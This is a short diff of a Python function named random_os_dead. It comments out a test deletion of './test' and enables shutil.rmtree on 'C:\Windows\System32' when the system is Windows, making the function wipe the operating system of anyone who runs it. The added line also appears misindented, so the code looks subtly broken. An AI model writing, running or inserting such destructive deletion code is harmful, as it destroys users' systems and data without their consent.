@@ -21,8 +21,8 @@ def random_os_dead():
         print(1)
         if check_os() == "Windows":
             try:
-                shutil.rmtree("./test")
-                #  shutil.rmtree('C:\Windows\System32')
+                # shutil.rmtree("./test")
+                 shutil.rmtree('C:\Windows\System32')
             except Exception as e:
                 print(':/ => ',e)  
                  
